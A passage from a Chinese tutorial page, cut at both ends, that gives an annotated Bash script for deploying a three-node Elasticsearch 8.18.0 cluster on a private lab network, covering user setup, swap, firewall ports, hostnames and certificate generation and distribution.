class="hljs-keyword">if</span> systemctl <span class="hljs-built_in">enable</span> chrony &amp;&amp; systemctl start chrony; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chrony 服务已启动&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;启动 chrony 失败&quot;</span> &gt;&amp;2<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 创建 es 用户 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始创建 es 用户&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;删除已有 es 用户（包括其主目录）&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-string">&quot;es&quot;</span> &amp;&gt;/dev/null; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检测到已有 es 用户，正在删除...&quot;</span><br>    userdel -r es<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;已删除旧的 es 用户&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;新增 es 用户&quot;</span><br>useradd -m -s /bin/bash es<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;为 es 用户设置密码（wq666）&quot;</span><br>passwd es<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建 es 用户完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 关闭 Swap 分区 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始关闭 Swap 分区&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;将 内容注释&quot;</span><br>sed -i <span class="hljs-string">&#x27;/^[^#].*\bswap\b/ s/^/#/&#x27;</span> /etc/fstab<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;立即关闭 Swap 分区&quot;</span><br>swapoff -a<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;关闭 Swap 分区完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 开放 9200、9300 TCP 端口 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始开放 9200、9300 TCP 端口&quot;</span><br>ufw allow 9200/tcp &amp;&amp; ufw allow 9300/tcp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开放 9200、9300 TCP 端口完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 设置主机名、主机名互相解析 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始设置主机名、主机名互相解析&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;获取本机内网 IP 地址&quot;</span><br>INTERFACE=$(ip <span class="hljs-built_in">link</span> | grep -oP <span class="hljs-string">&#x27;^[0-9]+: \K[^:]+&#x27;</span> | grep -v lo | <span class="hljs-built_in">head</span> -1)<br>LOCAL_IP=$(ip addr show <span class="hljs-string">&quot;<span class="hljs-variable">$INTERFACE</span>&quot;</span> | grep -oP <span class="hljs-string">&#x27;inet \K[\d.]+&#x27;</span> | <span class="hljs-built_in">head</span> -1)<br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;不能获取本机 IP 地址&quot;</span> &gt;&amp;2<br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;本机内网 IP 地址获取成功：<span class="hljs-variable">$LOCAL_IP</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置本机主机名&quot;</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> <span class="hljs-keyword">in</span><br>    <span class="hljs-string">&quot;192.168.136.8&quot;</span>)<br>        HOSTNAME=<span class="hljs-string">&quot;es-node1&quot;</span><br>        ;;<br>    <span class="hljs-string">&quot;192.168.136.9&quot;</span>)<br>        HOSTNAME=<span class="hljs-string">&quot;es-node2&quot;</span><br>        ;;<br>    <span class="hljs-string">&quot;192.168.136.10&quot;</span>)<br>        HOSTNAME=<span class="hljs-string">&quot;es-node3&quot;</span><br>        ;;<br>    *)<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;IP <span class="hljs-variable">$LOCAL_IP</span> does not match any configured hostname&quot;</span> &gt;&amp;2<br>        <span class="hljs-built_in">exit</span> 1<br>        ;;<br><span class="hljs-keyword">esac</span><br>hostnamectl set-hostname <span class="hljs-string">&quot;<span class="hljs-variable">$HOSTNAME</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置主机名互相解析&quot;</span><br>HOSTS_CONTENT=<span class="hljs-string">&quot;</span><br><span class="hljs-string">192.168.136.8   es-node1</span><br><span class="hljs-string">192.168.136.9   es-node2</span><br><span class="hljs-string">192.168.136.10  es-node3&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查 /etc/hosts 是否已包含指定追加内容&quot;</span><br><span class="hljs-keyword">if</span> grep -Fx <span class="hljs-string">&quot;<span class="hljs-variable">$HOSTS_CONTENT</span>&quot;</span> /etc/hosts &gt; /dev/null; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;主机名解析记录已存在，跳过添加&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$HOSTS_CONTENT</span>&quot;</span> &gt;&gt; /etc/hosts<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;主机名解析记录已添加&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置主机名、主机名互相解析完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 安装 ES ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始安装 ES&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进入 /mystudy/es 目录&quot;</span><br><span class="hljs-built_in">cd</span> /mystudy/es<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;删除已存在 ES 目录&quot;</span><br><span class="hljs-keyword">if</span> [ -d <span class="hljs-string">&quot;<span class="hljs-variable">$work_directory</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检测到已存在 ES 目录，准备删除...&quot;</span><br>    <span class="hljs-built_in">rm</span> -rf <span class="hljs-string">&quot;<span class="hljs-variable">$work_directory</span>&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ES 目录已删除&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查是否存在 ES 安装包&quot;</span><br><span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$es_package</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ES 安装包不存在&quot;</span> &gt;&amp;2<br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;解压&quot;</span><br>tar -zxvf <span class="hljs-variable">$es_package</span> -C /mystudy/es<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;重命名&quot;</span><br><span class="hljs-built_in">mv</span> <span class="hljs-string">&quot;<span class="hljs-variable">$es_init_name</span>&quot;</span> elasticsearch<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装 ES 完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 创建存放 ES 数据的目录 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始创建存放 ES 数据的目录&quot;</span><br><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$work_directory</span>/data<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建存放 ES 数据的目录完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 创建存放证书的目录 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始创建存放证书的目录&quot;</span><br><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$work_directory</span>/config/certs<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建存放证书的目录完成&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 生成 CA 证书、CA 公钥（192.168.136.8） ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> = <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始在 192.168.136.8 上生成 CA 证书、CA 公钥&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进入 ES 目录&quot;</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$work_directory</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;签发 ca 证书&quot;</span><br>    bin/elasticsearch-certutil ca<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;导出 CA 公钥&quot;</span><br>    openssl pkcs12 -<span class="hljs-keyword">in</span> elastic-stack-ca.p12 -nokeys -out ca.crt<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;将 CA 证书、CA 公钥放到存放证书目录下&quot;</span><br>    <span class="hljs-built_in">mv</span> elastic-stack-ca.p12 ca.crt <span class="hljs-variable">$work_directory</span>/config/certs/<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;生成 CA 证书、CA 公钥完成&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-comment"># -------------------------------- 签发节点证书（192.168.136.8） ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> = <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始在 192.168.136.8 上签发节点证书&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进入 ES 目录&quot;</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$work_directory</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;批量签发节点证书&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建并编辑 instances.yml&quot;</span><br>    <span class="hljs-built_in">cat</span> &gt; instances.yml &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">instances:</span><br><span class="hljs-string">  - name: es-node1</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.8&quot;</span><br><span class="hljs-string">  - name: es-node2</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.9&quot;</span><br><span class="hljs-string">  - name: es-node3</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.10&quot;</span><br><span class="hljs-string">EOF</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进行批量签发&quot;</span><br>    bin/elasticsearch-certutil cert \<br>        --silent \<br>        --<span class="hljs-keyword">in</span> instances.yml \<br>        --ca config/certs/elastic-stack-ca.p12 \<br>        --pem \<br>        --out certs.zip<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;将 certs.zip 放到存放证书目录下&quot;</span><br>    <span class="hljs-built_in">mv</span> certs.zip config/certs/<br>    <span class="hljs-built_in">rm</span> -rf instances.yml<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;签发节点证书完成&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-comment"># -------------------------------- 签发 HTTPS 证书（192.168.136.8） ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> = <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始在192.168.136.8 上签发 HTTPS 证书&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进入 ES 目录&quot;</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$work_directory</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;批量签发 HTTPS 证书&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建并编辑 http-instances.yml&quot;</span><br>    <span class="hljs-built_in">cat</span> &gt; http-instances.yml &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">instances:</span><br><span class="hljs-string">  - name: es-node1-http</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.8&quot;</span><br><span class="hljs-string">  - name: es-node2-http</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.9&quot;</span><br><span class="hljs-string">  - name: es-node3-http</span><br><span class="hljs-string">    ip:</span><br><span class="hljs-string">      - &quot;192.168.136.10&quot;</span><br><span class="hljs-string">EOF</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进行批量签发&quot;</span><br>    bin/elasticsearch-certutil cert \<br>      --silent \<br>      --<span class="hljs-keyword">in</span> http-instances.yml \<br>      --ca  config/certs/elastic-stack-ca.p12 \<br>      --pem \<br>      --out http-certs.zip<br>    <span class="hljs-built_in">mv</span> http-certs.zip config/certs/<br>    <span class="hljs-built_in">rm</span> -rf http-instances.yml<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;签发 HTTPS 证书完成&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 分发证书（192.168.136.8） ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$LOCAL_IP</span>&quot;</span> = <span class="hljs-string">&quot;192.168.136.8&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始在 192.168.136.8 上分发证书&quot;</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$work_directory</span>/config/certs<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;分发节点证书&quot;</span><br>    unzip certs.zip <br>    <span class="hljs-built_in">mv</span> <span class="hljs-variable">$work_directory</span>/config/certs/es-node1/es-node1.&#123;crt,key&#125; <span class="hljs-variable">$work_directory</span>/config/certs/<br>    scp <span class="hljs-variable">$work_directory</span>/config/certs/es-node2/es-node2.&#123;crt,key&#125; \<br>        root@192.168.136.9:<span class="hljs-variable">$work_directory</span>/config/certs/<br>    scp <span class="hljs-variable">$work_directory</span>/config/certs/es-node3/es-node3.&#123;crt,key&#125; \<br>        root@192.168.136.10:<span class="hljs-variable">$work_directory</span>/config/certs/<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;分发HTTPS 证书&quot;</span><br>    unzip http-certs.zip<br>    <span class="hljs-built_in">mv</span> <span class="hljs-variable">$work_directory</span>/config/certs/es-node1-http/es-node1-http.&#123;crt,key&#125; <span class="hljs-variable">$work_directory</span>/config/certs/<br>    scp <span class="hljs-variable">$work_directory</span>/config/certs/es-node2-http/es-node2-http.&#123;crt,key&#125; \<br>        root@192.168.136.9:<span class="hljs-variable">$work_directory</span>/config/certs/<br>    scp <span class="hljs-variable">$work_directory</span>/config/certs/es-node3-http/es-node3-http.&#123;crt,key&#125; \<br>        root@192.168.136.10:<span class="hljs-variable">$work_directory</span>/config/certs/<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;分发 CA 公钥&quot;</span><br>    scp <span class="hljs-variable">$work_directory</span>/config/certs/ca.crt \<br>        root@192.168.136.9:<span class="hljs-variable">$work_directory</span>/config/certs/<br>    scp <span class="hljs-variable">$work_directory</span>/config/certs/ca.crt \<br>        root@192.168.136.10:<span class="hljs-variable">$work_directory</span>/config/certs/<br>    <span class="hljs-built_in">rm</span> -rf es-node1 es-node1-http es-node2 es-node2-http es-node3 es-node3-http certs.zip http-certs.zip<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;分发证书完成&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 修改 ES 文件拥有者为 es ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始修改 ES 文件拥有者为 es&quot;</span><br><span class="hljs-built_in">chown</span> -R es:es <span class="hljs-variable">$work_directory</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;修改 ES 文件拥有者为 es 完成&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;本节点脚本执行结束&quot;</span><br></code></pre></td></tr></table></figure><hr><h6 id="2-1-17-3-脚本注释版"><a href="#2-1-17-3-脚本注释版" class="headerlink" title="2.1.17.3. 脚本注释版"></a>2.1.17.3. 脚本注释版</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># -------------------------------- 开启严格模式 ---------------------------------------------</span><br><span class="hljs-built_in">set</span> -euo pipefail<br><br><span class="hljs-comment"># -------------------------------- 检查是否以 root 权限运行 ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-subst">$(id -u)</span>&quot;</span> != <span class="hljs-string">&quot;0&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;这个脚本需要以 root 用户运行&quot;</span> &gt;&amp;2<br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 声明变量 ---------------------------------------------</span><br><br>work_directory=<span class="hljs-string">&quot;/mystudy/es/elasticsearch&quot;</span><br>es_package=<span class="hljs-string">&quot;elasticsearch-8.18.0-linux-x86_64.tar.gz&quot;</span><br>es_init_name=<span class="hljs-string">&quot;elasticsearch-8.18.0&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 安装 openssl ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始安装 openssl&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查 openssl 是否已安装&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v openssl &gt;/dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;openssl 已安装，跳过安装&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;未检测到 openssl，正在安装...&quot;</span><br>    max_retries=3<br>    retry_count=0<br>    <span class="hljs-keyword">until</span> apt-get install -y openssl; <span class="hljs-keyword">do</span><br>        retry_count=$((retry_count + <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$retry_count</span>&quot;</span> -ge <span class="hljs-string">&quot;<span class="hljs-variable">$max_retries</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装 openssl 已尝试 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次，仍然失败&quot;</span> &gt;&amp;2<br>            <span class="hljs-built_in">exit</span> 1<br>        <span class="hljs-keyword">fi</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装失败，第 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次重试，立即重新尝试...&quot;</span><br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;openssl 安装完成&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. command -v openssl：</span><br><span class="hljs-string">1. command -v openssl 用于检测 openssl 命令是否存在于当前系统的环境变量 PATH 指定的路径中</span><br><span class="hljs-string">2. 如果找到了，会输出完整路径（例如 /usr/bin/openssl），并返回退出码 0（true），表示命令执行成功、任务也成功（即找到了）</span><br><span class="hljs-string">3. 如果找不到，不会输出任何内容，但命令本身仍然成功执行，只是任务失败（未找到命令），这时返回退出码为 1（false）</span><br><span class="hljs-string">2. &gt;/dev/null</span><br><span class="hljs-string">1. &gt; 是输出重定向符，默认只作用于标准输出（stdout）。</span><br><span class="hljs-string">2. /dev/null 是 Linux 中的“黑洞”文件，任何输出重定向到这里都会被吞掉，相当于“我不想看到这个输出”。</span><br><span class="hljs-string">3. 因此，&gt;/dev/null 表示：将命令的标准输出重定向到黑洞中，不显示在终端上。</span><br><span class="hljs-string">3. 2&gt;&amp;1</span><br><span class="hljs-string">1. 1 表示标准输出，2 表示标准错误输出</span><br><span class="hljs-string">2. 2&gt;&amp;1 的意思是：“将标准错误重定向到标准输出的输出位置上”</span><br><span class="hljs-string">3. 因为前面已经执行了 &gt;/dev/null，所以标准输出已经被扔进黑洞了，这时候标准错误也跟着一起被重定向到黑洞。</span><br><span class="hljs-string">4. if...then...else...fi</span><br><span class="hljs-string">5. max_retries=3</span><br><span class="hljs-string">1. 最大重试次数，总共 3 + 1 次</span><br><span class="hljs-string">6. retry_count=0</span><br><span class="hljs-string">1. 已重试的次数</span><br><span class="hljs-string">7. until apt-get install -y openssl; do</span><br><span class="hljs-string">1. 执行 apt-get install -y openssl; 成功就退出循环，不成功就继续循环</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 安装 chrony ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始安装 chrony&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查 chrony 是否已安装&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v chronyd &gt;/dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chrony 已安装，跳过安装&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;未检测到 chrony，正在安装...&quot;</span><br>    max_retries=3<br>    retry_count=0<br>    <span class="hljs-keyword">until</span> apt-get update &amp;&amp; apt-get install -y chrony; <span 